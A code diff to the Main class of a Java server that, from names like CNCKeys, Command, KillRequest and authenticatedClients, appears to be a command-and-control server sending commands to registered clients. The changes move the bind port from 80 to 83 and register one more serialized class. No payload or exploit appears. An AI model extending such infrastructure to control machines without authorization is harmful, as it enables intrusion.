@@ -27,6 +27,7 @@ public class Main {
     //Place where key files are to be stored
     static final String PUBLIC_KEY_FILE = "CNCKeys/publicKey";
     static final String PRIVATE_KEY_FILE = "CNCKeys/privateKey";
+    public static final int COMMAND_PORT = 83;
 
     static final int RECONNECT_REQUEST_TIMEOUT = 2000;
 
@@ -43,7 +44,7 @@ public class Main {
     public static HashMap<String, String> authenticatedClients = new HashMap<String, String>();
 
     //List of classes to be registered with kryo for serialization/deserialization
-    public static final List<Class> KRYO_CLASSES = Arrays.asList(byte[].class,PublicKeyTransmission.class,KeyRequest.class,ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class
+    public static final List<Class> KRYO_CLASSES = Arrays.asList(BackgroundInitializer.class,byte[].class,PublicKeyTransmission.class,KeyRequest.class,ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class
     );
 
 
@@ -68,7 +69,7 @@ public class Main {
 
 
                     //Convert the file to a byte array
-                    log("Converting the public key into a byte array");
+                    log("Converting the public key into a byte  array");
                     File file = new File("CNCKeys/publicKey");
 
                     byte[] b = new byte[(int) file.length()];
@@ -106,10 +107,11 @@ public class Main {
         server = new Server(WRITEBUFFER, OBJECTBUFFER);
         server.start();
         try {
-            log("Binding to port 80");
-            server.bind(80);
-            log("Bound to port 80");
+            log("Binding to port: " + COMMAND_PORT);
+            server.bind(COMMAND_PORT);
+            log("Bound to port: " + COMMAND_PORT);
 
+             //TODO Run reachabilty diagnostics after port binding
         } catch (Exception e) {
             e.printStackTrace();
             error("Could not bind to port and start server");
